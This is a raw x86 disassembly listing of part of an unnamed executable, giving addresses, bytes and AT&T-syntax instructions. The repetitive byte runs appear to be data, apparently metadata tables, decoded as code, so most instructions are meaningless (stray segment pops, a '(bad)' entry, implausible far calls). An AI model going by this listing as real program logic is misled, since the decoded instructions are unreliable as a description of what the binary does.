  40633a:	1e                   	push   %ds
  40633b:	07                   	pop    %es
  40633c:	00 00                	add    %al,(%eax)
  40633e:	01 00                	add    %eax,(%eax)
  406340:	14 07                	adc    $0x7,%al
  406342:	00 00                	add    %al,(%eax)
  406344:	01 00                	add    %eax,(%eax)
  406346:	14 07                	adc    $0x7,%al
  406348:	00 00                	add    %al,(%eax)
  40634a:	01 00                	add    %eax,(%eax)
  40634c:	14 07                	adc    $0x7,%al
  40634e:	00 00                	add    %al,(%eax)
  406350:	01 00                	add    %eax,(%eax)
  406352:	14 07                	adc    $0x7,%al
  406354:	00 00                	add    %al,(%eax)
  406356:	02 00                	add    (%eax),%al
  406358:	1e                   	push   %ds
  406359:	07                   	pop    %es
  40635a:	00 00                	add    %al,(%eax)
  40635c:	03 00                	add    (%eax),%eax
  40635e:	28 07                	sub    %al,(%edi)
  406360:	00 00                	add    %al,(%eax)
  406362:	04 00                	add    $0x0,%al
  406364:	36 07                	ss pop %es
  406366:	00 00                	add    %al,(%eax)
  406368:	01 00                	add    %eax,(%eax)
  40636a:	14 07                	adc    $0x7,%al
  40636c:	00 00                	add    %al,(%eax)
  40636e:	01 00                	add    %eax,(%eax)
  406370:	14 07                	adc    $0x7,%al
  406372:	00 00                	add    %al,(%eax)
  406374:	02 00                	add    (%eax),%al
  406376:	1e                   	push   %ds
  406377:	07                   	pop    %es
  406378:	00 00                	add    %al,(%eax)
  40637a:	01 00                	add    %eax,(%eax)
  40637c:	14 07                	adc    $0x7,%al
  40637e:	00 00                	add    %al,(%eax)
  406380:	01 00                	add    %eax,(%eax)
  406382:	14 07                	adc    $0x7,%al
  406384:	00 00                	add    %al,(%eax)
  406386:	02 00                	add    (%eax),%al
  406388:	1e                   	push   %ds
  406389:	07                   	pop    %es
  40638a:	00 00                	add    %al,(%eax)
  40638c:	01 00                	add    %eax,(%eax)
  40638e:	14 07                	adc    $0x7,%al
  406390:	00 00                	add    %al,(%eax)
  406392:	01 00                	add    %eax,(%eax)
  406394:	14 07                	adc    $0x7,%al
  406396:	00 00                	add    %al,(%eax)
  406398:	01 00                	add    %eax,(%eax)
  40639a:	14 07                	adc    $0x7,%al
  40639c:	00 00                	add    %al,(%eax)
  40639e:	02 00                	add    (%eax),%al
  4063a0:	1e                   	push   %ds
  4063a1:	07                   	pop    %es
  4063a2:	00 00                	add    %al,(%eax)
  4063a4:	01 00                	add    %eax,(%eax)
  4063a6:	14 07                	adc    $0x7,%al
  4063a8:	00 00                	add    %al,(%eax)
  4063aa:	02 00                	add    (%eax),%al
  4063ac:	1e                   	push   %ds
  4063ad:	07                   	pop    %es
  4063ae:	00 00                	add    %al,(%eax)
  4063b0:	03 00                	add    (%eax),%eax
  4063b2:	28 07                	sub    %al,(%edi)
  4063b4:	00 00                	add    %al,(%eax)
  4063b6:	01 00                	add    %eax,(%eax)
  4063b8:	14 07                	adc    $0x7,%al
  4063ba:	00 00                	add    %al,(%eax)
  4063bc:	01 00                	add    %eax,(%eax)
  4063be:	14 07                	adc    $0x7,%al
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	01 00                	add    %eax,(%eax)
  4063c4:	14 07                	adc    $0x7,%al
  4063c6:	00 00                	add    %al,(%eax)
  4063c8:	01 00                	add    %eax,(%eax)
  4063ca:	14 07                	adc    $0x7,%al
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	02 00                	add    (%eax),%al
  4063d0:	1e                   	push   %ds
  4063d1:	07                   	pop    %es
  4063d2:	00 00                	add    %al,(%eax)
  4063d4:	03 00                	add    (%eax),%eax
  4063d6:	28 07                	sub    %al,(%edi)
  4063d8:	00 00                	add    %al,(%eax)
  4063da:	04 00                	add    $0x0,%al
  4063dc:	36 07                	ss pop %es
  4063de:	00 00                	add    %al,(%eax)
  4063e0:	01 00                	add    %eax,(%eax)
  4063e2:	14 07                	adc    $0x7,%al
  4063e4:	00 00                	add    %al,(%eax)
  4063e6:	02 00                	add    (%eax),%al
  4063e8:	1e                   	push   %ds
  4063e9:	07                   	pop    %es
  4063ea:	00 00                	add    %al,(%eax)
  4063ec:	03 00                	add    (%eax),%eax
  4063ee:	28 07                	sub    %al,(%edi)
  4063f0:	00 00                	add    %al,(%eax)
  4063f2:	04 00                	add    $0x0,%al
  4063f4:	36 07                	ss pop %es
  4063f6:	00 00                	add    %al,(%eax)
  4063f8:	05 00 2f 07 00       	add    $0x72f00,%eax
  4063fd:	00 01                	add    %al,(%ecx)
  4063ff:	00 14 07             	add    %dl,(%edi,%eax,1)
  406402:	00 00                	add    %al,(%eax)
  406404:	02 00                	add    (%eax),%al
  406406:	1e                   	push   %ds
  406407:	07                   	pop    %es
  406408:	00 00                	add    %al,(%eax)
  40640a:	03 00                	add    (%eax),%eax
  40640c:	28 07                	sub    %al,(%edi)
  40640e:	00 00                	add    %al,(%eax)
  406410:	04 00                	add    $0x0,%al
  406412:	36 07                	ss pop %es
  406414:	00 00                	add    %al,(%eax)
  406416:	01 00                	add    %eax,(%eax)
  406418:	14 07                	adc    $0x7,%al
  40641a:	00 00                	add    %al,(%eax)
  40641c:	01 00                	add    %eax,(%eax)
  40641e:	14 07                	adc    $0x7,%al
  406420:	00 00                	add    %al,(%eax)
  406422:	02 00                	add    (%eax),%al
  406424:	1e                   	push   %ds
  406425:	07                   	pop    %es
  406426:	00 00                	add    %al,(%eax)
  406428:	01 00                	add    %eax,(%eax)
  40642a:	14 07                	adc    $0x7,%al
  40642c:	00 00                	add    %al,(%eax)
  40642e:	01 00                	add    %eax,(%eax)
  406430:	14 07                	adc    $0x7,%al
  406432:	00 00                	add    %al,(%eax)
  406434:	02 00                	add    (%eax),%al
  406436:	1e                   	push   %ds
  406437:	07                   	pop    %es
  406438:	00 00                	add    %al,(%eax)
  40643a:	01 00                	add    %eax,(%eax)
  40643c:	14 07                	adc    $0x7,%al
  40643e:	00 00                	add    %al,(%eax)
  406440:	01 00                	add    %eax,(%eax)
  406442:	14 07                	adc    $0x7,%al
  406444:	00 00                	add    %al,(%eax)
  406446:	01 00                	add    %eax,(%eax)
  406448:	14 07                	adc    $0x7,%al
  40644a:	00 00                	add    %al,(%eax)
  40644c:	02 00                	add    (%eax),%al
  40644e:	1e                   	push   %ds
  40644f:	07                   	pop    %es
  406450:	00 00                	add    %al,(%eax)
  406452:	03 00                	add    (%eax),%eax
  406454:	28 07                	sub    %al,(%edi)
  406456:	02 00                	add    (%eax),%al
  406458:	04 00                	add    $0x0,%al
  40645a:	36 07                	ss pop %es
  40645c:	00 00                	add    %al,(%eax)
  40645e:	01 00                	add    %eax,(%eax)
  406460:	14 07                	adc    $0x7,%al
  406462:	00 00                	add    %al,(%eax)
  406464:	02 00                	add    (%eax),%al
  406466:	1e                   	push   %ds
  406467:	07                   	pop    %es
  406468:	00 00                	add    %al,(%eax)
  40646a:	03 00                	add    (%eax),%eax
  40646c:	28 07                	sub    %al,(%edi)
  40646e:	00 00                	add    %al,(%eax)
  406470:	04 00                	add    $0x0,%al
  406472:	36 07                	ss pop %es
  406474:	00 00                	add    %al,(%eax)
  406476:	05 00 2f 07 00       	add    $0x72f00,%eax
  40647b:	00 06                	add    %al,(%esi)
  40647d:	00 3d 07 00 00 07    	add    %bh,0x7000007
  406483:	00 44 07 00          	add    %al,0x0(%edi,%eax,1)
  406487:	00 01                	add    %al,(%ecx)
  406489:	00 14 07             	add    %dl,(%edi,%eax,1)
  40648c:	00 00                	add    %al,(%eax)
  40648e:	02 00                	add    (%eax),%al
  406490:	1e                   	push   %ds
  406491:	07                   	pop    %es
  406492:	00 00                	add    %al,(%eax)
  406494:	03 00                	add    (%eax),%eax
  406496:	28 07                	sub    %al,(%edi)
  406498:	00 00                	add    %al,(%eax)
  40649a:	04 00                	add    $0x0,%al
  40649c:	36 07                	ss pop %es
  40649e:	00 00                	add    %al,(%eax)
  4064a0:	05 00 2f 07 00       	add    $0x72f00,%eax
  4064a5:	00 06                	add    %al,(%esi)
  4064a7:	00 3d 07 00 00 01    	add    %bh,0x1000007
  4064ad:	00 14 07             	add    %dl,(%edi,%eax,1)
  4064b0:	00 00                	add    %al,(%eax)
  4064b2:	02 00                	add    (%eax),%al
  4064b4:	1e                   	push   %ds
  4064b5:	07                   	pop    %es
  4064b6:	00 00                	add    %al,(%eax)
  4064b8:	03 00                	add    (%eax),%eax
  4064ba:	28 07                	sub    %al,(%edi)
  4064bc:	00 00                	add    %al,(%eax)
  4064be:	04 00                	add    $0x0,%al
  4064c0:	36 07                	ss pop %es
  4064c2:	00 00                	add    %al,(%eax)
  4064c4:	05 00 2f 07 00       	add    $0x72f00,%eax
  4064c9:	00 01                	add    %al,(%ecx)
  4064cb:	00 14 07             	add    %dl,(%edi,%eax,1)
  4064ce:	00 00                	add    %al,(%eax)
  4064d0:	02 00                	add    (%eax),%al
  4064d2:	1e                   	push   %ds
  4064d3:	07                   	pop    %es
  4064d4:	00 00                	add    %al,(%eax)
  4064d6:	03 00                	add    (%eax),%eax
  4064d8:	28 07                	sub    %al,(%edi)
  4064da:	00 00                	add    %al,(%eax)
  4064dc:	01 00                	add    %eax,(%eax)
  4064de:	14 07                	adc    $0x7,%al
  4064e0:	00 00                	add    %al,(%eax)
  4064e2:	02 00                	add    (%eax),%al
  4064e4:	1e                   	push   %ds
  4064e5:	07                   	pop    %es
  4064e6:	02 00                	add    (%eax),%al
  4064e8:	03 00                	add    (%eax),%eax
  4064ea:	28 07                	sub    %al,(%edi)
  4064ec:	00 00                	add    %al,(%eax)
  4064ee:	04 00                	add    $0x0,%al
  4064f0:	36 07                	ss pop %es
  4064f2:	01 00                	add    %eax,(%eax)
  4064f4:	01 00                	add    %eax,(%eax)
  4064f6:	14 07                	adc    $0x7,%al
  4064f8:	02 00                	add    (%eax),%al
  4064fa:	02 00                	add    (%eax),%al
  4064fc:	1e                   	push   %ds
  4064fd:	07                   	pop    %es
  4064fe:	00 00                	add    %al,(%eax)
  406500:	01 00                	add    %eax,(%eax)
  406502:	14 07                	adc    $0x7,%al
  406504:	00 00                	add    %al,(%eax)
  406506:	01 00                	add    %eax,(%eax)
  406508:	14 07                	adc    $0x7,%al
  40650a:	00 00                	add    %al,(%eax)
  40650c:	01 00                	add    %eax,(%eax)
  40650e:	14 07                	adc    $0x7,%al
  406510:	00 00                	add    %al,(%eax)
  406512:	01 00                	add    %eax,(%eax)
  406514:	14 07                	adc    $0x7,%al
  406516:	00 00                	add    %al,(%eax)
  406518:	02 00                	add    (%eax),%al
  40651a:	1e                   	push   %ds
  40651b:	07                   	pop    %es
  40651c:	00 00                	add    %al,(%eax)
  40651e:	01 00                	add    %eax,(%eax)
  406520:	14 07                	adc    $0x7,%al
  406522:	00 00                	add    %al,(%eax)
  406524:	02 00                	add    (%eax),%al
  406526:	1e                   	push   %ds
  406527:	07                   	pop    %es
  406528:	00 00                	add    %al,(%eax)
  40652a:	01 00                	add    %eax,(%eax)
  40652c:	14 07                	adc    $0x7,%al
  40652e:	00 00                	add    %al,(%eax)
  406530:	02 00                	add    (%eax),%al
  406532:	1e                   	push   %ds
  406533:	07                   	pop    %es
  406534:	04 00                	add    $0x0,%al
  406536:	0a 00                	or     (%eax),%al
  406538:	04 00                	add    $0x0,%al
  40653a:	1c 00                	sbb    $0x0,%al
  40653c:	04 00                	add    $0x0,%al
  40653e:	06                   	push   %es
  40653f:	00 04 00             	add    %al,(%eax,%eax,1)
  406542:	3c 00                	cmp    $0x0,%al
  406544:	04 00                	add    $0x0,%al
  406546:	44                   	inc    %esp
  406547:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40654a:	1c 00                	sbb    $0x0,%al
  40654c:	13 00                	adc    (%eax),%eax
  40654e:	44                   	inc    %esp
  40654f:	00 13                	add    %dl,(%ebx)
  406551:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406554:	a9 00 4e 07 12       	test   $0x12074e00,%eax
  406559:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40655c:	5d                   	pop    %ebp
  40655d:	07                   	pop    %es
  40655e:	63 01                	arpl   %eax,(%ecx)
  406560:	14 00                	adc    $0x0,%al
  406562:	7f 07                	jg     0x40656b
  406564:	d6                   	salc
  406565:	00 51 00             	add    %dl,0x0(%ecx)
  406568:	4e                   	dec    %esi
  406569:	07                   	pop    %es
  40656a:	dc 01                	faddl  (%ecx)
  40656c:	b1 00                	mov    $0x0,%cl
  40656e:	4e                   	dec    %esi
  40656f:	07                   	pop    %es
  406570:	12 00                	adc    (%eax),%al
  406572:	29 02                	sub    %eax,(%edx)
  406574:	4e                   	dec    %esi
  406575:	07                   	pop    %es
  406576:	0d 00 31 02 4e       	or     $0x4e023100,%eax
  40657b:	07                   	pop    %es
  40657c:	12 00                	adc    (%eax),%al
  40657e:	f9                   	stc
  40657f:	01 4e 07             	add    %ecx,0x7(%esi)
  406582:	15 02 d9 01 4e       	adc    $0x4e01d902,%eax
  406587:	07                   	pop    %es
  406588:	15 02 c9 01 4e       	adc    $0x4e01c902,%eax
  40658d:	07                   	pop    %es
  40658e:	15 02 c1 01 4e       	adc    $0x4e01c102,%eax
  406593:	07                   	pop    %es
  406594:	15 02 f1 01 4e       	adc    $0x4e01f102,%eax
  406599:	07                   	pop    %es
  40659a:	15 02 d1 01 4e       	adc    $0x4e01d102,%eax
  40659f:	07                   	pop    %es
  4065a0:	15 02 01 02 4e       	adc    $0x4e020102,%eax
  4065a5:	07                   	pop    %es
  4065a6:	15 02 41 02 4e       	adc    $0x4e024102,%eax
  4065ab:	07                   	pop    %es
  4065ac:	38 02                	cmp    %al,(%edx)
  4065ae:	49                   	dec    %ecx
  4065af:	02 4e 07             	add    0x7(%esi),%cl
  4065b2:	15 02 e1 01 4e       	adc    $0x4e01e102,%eax
  4065b7:	07                   	pop    %es
  4065b8:	15 02 59 02 4e       	adc    $0x4e025902,%eax
  4065bd:	07                   	pop    %es
  4065be:	15 02 39 02 4e       	adc    $0x4e023902,%eax
  4065c3:	07                   	pop    %es
  4065c4:	12 00                	adc    (%eax),%al
  4065c6:	a1 01 4e 07 12       	mov    0x12074e01,%eax
  4065cb:	00 a1 02 42 08 bc    	add    %ah,-0x43f7bdfe(%ecx)
  4065d1:	02 a1 02 54 08 1a    	add    0x1a085402(%ecx),%ah
  4065d7:	00 99 01 4e 07 12    	add    %bl,0x12074e01(%ecx)
  4065dd:	00 99 02 4e 07 f4    	add    %bl,-0xbf8b1fe(%ecx)
  4065e3:	02 81 00 68 08 36    	add    0x36086800(%ecx),%al
  4065e9:	00 f1                	add    %dh,%cl
  4065eb:	00 72 08             	add    %dh,0x8(%edx)
  4065ee:	fc                   	cld
  4065ef:	02 51 01             	add    0x1(%ecx),%dl
  4065f2:	80 08 02             	orb    $0x2,(%eax)
  4065f5:	03 41 01             	add    0x1(%ecx),%eax
  4065f8:	88 08                	mov    %cl,(%eax)
  4065fa:	08 03                	or     %al,(%ebx)
  4065fc:	b1 01                	mov    $0x1,%cl
  4065fe:	4e                   	dec    %esi
  4065ff:	07                   	pop    %es
  406600:	12 00                	adc    (%eax),%al
  406602:	b1 01                	mov    $0x1,%cl
  406604:	8f 08 0d 03          	(bad)
  406608:	91                   	xchg   %eax,%ecx
  406609:	01 4e 07             	add    %ecx,0x7(%esi)
  40660c:	12 00                	adc    (%eax),%al
  40660e:	91                   	xchg   %eax,%ecx
  40660f:	01 94 08 dc 01 11 01 	add    %edx,0x11101dc(%eax,%ecx,1)
  406616:	a1 08 12 00 71       	mov    0x71001208,%eax
  40661b:	02 a9 08 12 03 41    	add    0x41031208(%ecx),%ch
  406621:	01 b0 08 19 03 41    	add    %esi,0x41031908(%eax)
  406627:	01 bd 08 1f 03 71    	add    %edi,0x71031f08(%ebp)
  40662d:	02 a9 08 26 03 71    	add    0x71032608(%ecx),%ch
  406633:	02 cb                	add    %bl,%cl
  406635:	08 2f                	or     %ch,(%edi)
  406637:	00 a1 01 d1 08 2c    	add    %ah,0x2c08d101(%ecx)
  40663d:	03 71 02             	add    0x2(%ecx),%esi
  406640:	da 08                	fimull (%eax)
  406642:	08 03                	or     %al,(%ebx)
  406644:	71 02                	jno    0x406648
  406646:	e8 08 30 03 41       	call   0x41439653
  40664b:	01 f6                	add    %esi,%esi
  40664d:	08 4f 00             	or     %cl,0x0(%edi)
  406650:	89 00                	mov    %eax,(%eax)
  406652:	02 09                	add    (%ecx),%cl
  406654:	39 03                	cmp    %eax,(%ebx)
  406656:	b9 01 13 09 3f       	mov    $0x3f091301,%ecx
  40665b:	03 b9 01 18 09 47    	add    0x47091801(%ecx),%edi
  406661:	03 11                	add    (%ecx),%edx
  406663:	02 27                	add    (%edi),%ah
  406665:	09 4d 03             	or     %ecx,0x3(%ebp)
  406668:	71 02                	jno    0x40666c
  40666a:	a9 08 02 03 41       	test   $0x41030208,%eax
  40666f:	01 2e                	add    %ebp,(%esi)
  406671:	09 19                	or     %ebx,(%ecx)
  406673:	03 b9 00 3c 09 58    	add    0x58093c00(%ecx),%edi
  406679:	03 b9 00 4e 09 5d    	add    0x5d094e00(%ecx),%edi
  40667f:	03 a1 00 59 09 3b    	add    0x3b095900(%ecx),%esp
  406685:	00 f1                	add    %dh,%cl
  406687:	00 68 09             	add    %ch,0x9(%eax)
  40668a:	61                   	popa
  40668b:	03 49 01             	add    0x1(%ecx),%ecx
  40668e:	4e                   	dec    %esi
  40668f:	07                   	pop    %es
  406690:	6e                   	outsb  %ds:(%esi),(%dx)
  406691:	03 49 01             	add    0x1(%ecx),%ecx
  406694:	4e                   	dec    %esi
  406695:	07                   	pop    %es
  406696:	12 00                	adc    (%eax),%al
  406698:	21 01                	and    %eax,(%ecx)
  40669a:	4e                   	dec    %esi
  40669b:	07                   	pop    %es
  40669c:	74 03                	je     0x4066a1
  40669e:	59                   	pop    %ecx
  40669f:	01 6d 09             	add    %ebp,0x9(%ebp)
  4066a2:	ab                   	stos   %eax,%es:(%edi)
  4066a3:	00 59 01             	add    %bl,0x1(%ecx)
  4066a6:	a1 08 12 00 49       	mov    0x49001208,%eax
  4066ab:	01 74 09 7e          	add    %esi,0x7e(%ecx,%ecx,1)
  4066af:	03 71 02             	add    0x2(%ecx),%esi
  4066b2:	7c 09                	jl     0x4066bd
  4066b4:	a2 03 71 02 84       	mov    %al,0x84027103
  4066b9:	09 a7 03 24 00 4e    	or     %esp,0x4e002403(%edi)
  4066bf:	07                   	pop    %es
  4066c0:	12 00                	adc    (%eax),%al
  4066c2:	71 02                	jno    0x4066c6
  4066c4:	8c 09                	mov    %cs,(%ecx)
  4066c6:	b3 03                	mov    $0x3,%bl
  4066c8:	24 00                	and    $0x0,%al
  4066ca:	96                   	xchg   %eax,%esi
  4066cb:	09 b9 03 24 00 9f    	or     %edi,-0x60ffdbfd(%ecx)
  4066d1:	09 bf 03 71 02 a3    	or     %edi,-0x5cfd8efd(%edi)
  4066d7:	09 1a                	or     %ebx,(%edx)
  4066d9:	00 24 00             	add    %ah,(%eax,%eax,1)
  4066dc:	ae                   	scas   %es:(%edi),%al
  4066dd:	09 c5                	or     %eax,%ebp
  4066df:	03 71 02             	add    0x2(%ecx),%esi
  4066e2:	b7 09                	mov    $0x9,%bh
  4066e4:	b3 03                	mov    $0x3,%bl
  4066e6:	89 02                	mov    %eax,(%edx)
  4066e8:	4e                   	dec    %esi
  4066e9:	07                   	pop    %es
  4066ea:	12 00                	adc    (%eax),%al
  4066ec:	71 02                	jno    0x4066f0
  4066ee:	be 09 cb 03 89       	mov    $0x8903cb09,%esi
  4066f3:	02 c8                	add    %al,%cl
  4066f5:	09 d0                	or     %edx,%eax
  4066f7:	03 89 02 c8 09 d7    	add    -0x28f637fe(%ecx),%ecx
  4066fd:	03 89 02 cf 09 d7    	add    -0x28f630fe(%ecx),%ecx
  406703:	03 89 02 4e 07 0d    	add    0xd074e02(%ecx),%ecx
  406709:	00 b9 00 4e 07 12    	add    %bh,0x12074e00(%ecx)
  40670f:	00 b9 00 da 09 f1    	add    %bh,-0xef62600(%ecx)
  406715:	03 d1                	add    %ecx,%edx
  406717:	00 e8                	add    %ch,%al
  406719:	09 15 02 d1 00 f5    	or     %edx,0xf500d102
  40671f:	09 15 02 d1 00 03    	or     %edx,0x300d102
  406725:	0a 15 02 d1 00 18    	or     0x1800d102,%dl
  40672b:	0a 38                	or     (%eax),%bh
  40672d:	02 d1                	add    %cl,%dl
  40672f:	00 2c 0a             	add    %ch,(%edx,%ecx,1)
  406732:	38 02                	cmp    %al,(%edx)
  406734:	d1 00                	roll   $1,(%eax)
  406736:	3f                   	aas
  406737:	0a 38                	or     (%eax),%bh
  406739:	02 d1                	add    %cl,%dl
  40673b:	00 59 0a             	add    %bl,0xa(%ecx)
  40673e:	38 02                	cmp    %al,(%edx)
  406740:	99                   	cltd
  406741:	00 4e 07             	add    %cl,0x7(%esi)
  406744:	f6 03 b9             	testb  $0xb9,(%ebx)
  406747:	00 74 0a fc          	add    %dh,-0x4(%edx,%ecx,1)
  40674b:	03 b9 00 8b 0a 16    	add    0x160a8b00(%ecx),%edi
  406751:	00 b9 00 91 0a 12    	add    %bh,0x120a9100(%ecx)
  406757:	00 b9 00 a5 0a 02    	add    %bh,0x20aa500(%ecx)
  40675d:	04 51                	add    $0x51,%al
  40675f:	01 b1 0a 4f 00 29    	add    %esi,0x29004f0a(%ecx)
  406765:	01 88 08 08 03 29    	add    %ecx,0x29030808(%eax)
  40676b:	01 c2                	add    %eax,%edx
  40676d:	0a 0b                	or     (%ebx),%cl
  40676f:	04 91                	add    $0x91,%al
  406771:	00 d2                	add    %dl,%dl
  406773:	0a 2c 03             	or     (%ebx,%eax,1),%ch
  406776:	71 02                	jno    0x40677a
  406778:	db 0a                	fisttpl (%edx)
  40677a:	2c 03                	sub    $0x3,%al
  40677c:	2c 00                	sub    $0x0,%al
  40677e:	4e                   	dec    %esi
  40677f:	07                   	pop    %es
  406780:	12 00                	adc    (%eax),%al
  406782:	e1 00                	loope  0x406784
  406784:	4e                   	dec    %esi
  406785:	07                   	pop    %es
  406786:	2b 04 e1             	sub    (%ecx,%eiz,8),%eax
  406789:	00 e0                	add    %ah,%al
  40678b:	0a 31                	or     (%ecx),%dh
  40678d:	04 e1                	add    $0xe1,%al
  40678f:	00 4e 07             	add    %cl,0x7(%esi)
  406792:	12 00                	adc    (%eax),%al
  406794:	d9 00                	flds   (%eax)
  406796:	e9 0a 37 04 09       	jmp    0x9449ea5
  40679b:	02 f3                	add    %bl,%dh
  40679d:	0a 3d 04 a9 02 05    	or     0x502a904,%bh
  4067a3:	0b 43 04             	or     0x4(%ebx),%eax
  4067a6:	a9 02 17 0b 4c       	test   $0x4c0b1702,%eax
  4067ab:	04 2c                	add    $0x2c,%al
  4067ad:	00 23                	add    %ah,(%ebx)
  4067af:	0b 56 04             	or     0x4(%esi),%edx
  4067b2:	91                   	xchg   %eax,%ecx
  4067b3:	02 2f                	add    (%edi),%ch
  4067b5:	0b cb                	or     %ebx,%ecx
  4067b7:	04 b9                	add    $0xb9,%al
  4067b9:	01 35 0b d2 04 b9    	add    %esi,0xb904d20b
  4067bf:	01 4a 0b             	add    %ecx,0xb(%edx)
  4067c2:	d2 04 89             	rolb   %cl,(%ecx,%ecx,4)
  4067c5:	02 d1                	add    %cl,%dl
  4067c7:	08 2c 03             	or     %ch,(%ebx,%eax,1)
  4067ca:	b9 01 5d 0b d8       	mov    $0xd80b5d01,%ecx
  4067cf:	04 71                	add    $0x71,%al
  4067d1:	02 4e 07             	add    0x7(%esi),%cl
  4067d4:	df 04 59             	filds  (%ecx,%ebx,2)
  4067d7:	01 77 0b             	add    %esi,0xb(%edi)
  4067da:	7b 01                	jnp    0x4067dd
  4067dc:	91                   	xchg   %eax,%ecx
  4067dd:	02 68 09             	add    0x9(%eax),%ch
  4067e0:	e5 04                	in     $0x4,%eax
  4067e2:	81 02 84 0b ea 04    	addl   $0x4ea0b84,(%edx)
  4067e8:	81 02 90 0b f0 04    	addl   $0x4f00b90,(%edx)
  4067ee:	69 01 d1 08 f8 04    	imul   $0x4f808d1,(%ecx),%eax
  4067f4:	71 02                	jno    0x4067f8
  4067f6:	9a 0b 4f 00 2c 00 a1 	lcall  $0xa100,$0x2c004f0b
  4067fd:	0b fd                	or     %ebp,%edi
  4067ff:	04 2c                	add    $0x2c,%al
  406801:	00 aa 0b 1a 00 b9    	add    %ch,-0x46ffe5f5(%edx)
  406807:	01 b4 0b 0b 05 b9 01 	add    %esi,0x1b9050b(%ebx,%ecx,1)
  40680e:	bc 0b 2c 03 e9       	mov    $0xe9032c0b,%esp
  406813:	01 4e 07             	add    %ecx,0x7(%esi)
  406816:	15 02 e9 01 c9       	adc    $0xc901e902,%eax
  40681b:	0b 7e 03             	or     0x3(%esi),%edi
  40681e:	a9 02 db 0b 23       	test   $0x230bdb02,%eax
  406823:	05 b9 01 e8 08       	add    $0x8e801b9,%eax
  406828:	29 05 b9 01 17 0b    	sub    %eax,0xb1701b9
  40682e:	29 05 39 01 4e 07    	sub    %eax,0x74e0139
  406834:	12 00                	adc    (%eax),%al
  406836:	59                   	pop    %ecx
  406837:	01 e8                	add    %ebp,%eax
  406839:	0b 1a                	or     (%edx),%ebx
  40683b:	00 59 01             	add    %bl,0x1(%ecx)
  40683e:	f1                   	int1
  40683f:	0b 42 05             	or     0x5(%edx),%eax
  406842:	59                   	pop    %ecx
  406843:	01 f6                	add    %esi,%esi
  406845:	0b 12                	or     (%edx),%edx
  406847:	00 21                	add    %ah,(%ecx)
  406849:	00 4e 07             	add    %cl,0x7(%esi)
  40684c:	12 00                	adc    (%eax),%al
  40684e:	39 00                	cmp    %eax,(%eax)
  406850:	fc                   	cld
  406851:	0b 59 05             	or     0x5(%ecx),%ebx
  406854:	09 00                	or     %eax,(%eax)
  406856:	06                   	push   %es
  406857:	0c 6a                	or     $0x6a,%al
  406859:	05 11 00 12 0c       	add    $0xc120011,%eax
  40685e:	6e                   	outsb  %ds:(%esi),(%dx)
  40685f:	05 09 00 1d 0c       	add    $0xc1d0009,%eax
  406864:	6a 05                	push   $0x5
  406866:	11 00                	adc    %eax,(%eax)
  406868:	2a 0c 74             	sub    (%esp,%esi,2),%cl
  40686b:	05 11 00 f6 0b       	add    $0xbf60011,%eax
  406870:	12 00                	adc    (%eax),%al
  406872:	11 00                	adc    %eax,(%eax)
  406874:	33 0c 6e             	xor    (%esi,%ebp,2),%ecx
  406877:	05 11 00 40 0c       	add    $0xc400011,%eax
  40687c:	80 05 f1 00 49 0c 88 	addb   $0x88,0xc4900f1
  406883:	05 a9 01 57 0c       	add    $0xc5701a9,%eax
  406888:	8e 05 d1 02 63 0c    	mov    0xc6302d1,%es
  40688e:	1a 00                	sbb    (%eax),%al
  406890:	79 01                	jns    0x406893
  406892:	6d                   	insl   (%dx),%es:(%edi)
  406893:	0c 80                	or     $0x80,%al
  406895:	01 79 01             	add    %edi,0x1(%ecx)
  406898:	76 0c                	jbe    0x4068a6
  40689a:	3b 01                	cmp    (%ecx),%eax
  40689c:	79 01                	jns    0x40689f
  40689e:	17                   	pop    %ss
  40689f:	0b 9b 05 01 01 4e    	or     0x4e010105(%ebx),%ebx
  4068a5:	07                   	pop    %es
  4068a6:	12 00                	adc    (%eax),%al
  4068a8:	79 01                	jns    0x4068ab
  4068aa:	7b 0c                	jnp    0x4068b8
  4068ac:	a1 05 51 02 87       	mov    0x87025105,%eax
  4068b1:	0c a6                	or     $0xa6,%al
  4068b3:	05 51 02 8c 0c       	add    $0xc8c0251,%eax
  4068b8:	c2 05 79             	ret    $0x7905
  4068bb:	01 7b 0c             	add    %edi,0xc(%ebx)
  4068be:	c7 05 79 01 7b 0c cc 	movl   $0x25105cc,0xc7b0179
  4068c5:	05 51 02 
  4068c8:	93                   	xchg   %eax,%ebx
  4068c9:	0c d1                	or     $0xd1,%al
  4068cb:	05 51 02 9d 0c       	add    $0xc9d0251,%eax
  4068d0:	d6                   	salc
  4068d1:	05 51 02 9d 0c       	add    $0xc9d0251,%eax
  4068d6:	db 05 51 02 e8 0b    	fildl  0xbe80251
  4068dc:	e1 05                	loope  0x4068e3
  4068de:	b9 00 a7 0c f1       	mov    $0xf10ca700,%ecx
  4068e3:	05 79 00 7f 07       	add    $0x77f0079,%eax
  4068e8:	f6 05 71 00 b3 0c 1e 	testb  $0x1e,0xcb30071
  4068ef:	00 c1                	add    %al,%cl
  4068f1:	00 bf 0c 2c 03 71    	add    %bh,0x71032c0c(%edi)
  4068f7:	02 cc                	add    %ah,%cl
  4068f9:	0c 2c                	or     $0x2c,%al
  4068fb:	03 71 02             	add    0x2(%ecx),%esi
  4068fe:	d4 0c                	aam    $0xc
  406900:	fb                   	sti
  406901:	05 c1 00 dd 0c       	add    $0xcdd00c1,%eax
  406906:	5d                   	pop    %ebp
  406907:	03 71 00             	add    0x0(%ecx),%esi
  40690a:	ed                   	in     (%dx),%eax
  40690b:	0c 16                	or     $0x16,%al
  40690d:	00 79 01             	add    %bh,0x1(%ecx)
  406910:	f6 0c 77 01          	testb  $0x1,(%edi,%esi,2)
  406914:	51                   	push   %ecx
  406915:	02 fe                	add    %dh,%bh
  406917:	0c 10                	or     $0x10,%al
  406919:	06                   	push   %es
  40691a:	71 02                	jno    0x40691e
  40691c:	0e                   	push   %cs
  40691d:	0d 15 06 81 01       	or     $0x1810615,%eax
  406922:	4e                   	dec    %esi
  406923:	07                   	pop    %es
  406924:	12 00                	adc    (%eax),%al
  406926:	89 01                	mov    %eax,(%ecx)
  406928:	4e                   	dec    %esi
  406929:	07                   	pop    %es
  40692a:	12 00                	adc    (%eax),%al
  40692c:	21 02                	and    %eax,(%edx)
  40692e:	4e                   	dec    %esi
  40692f:	07                   	pop    %es
  406930:	1d 06 21 02 15       	sbb    $0x15022106,%eax
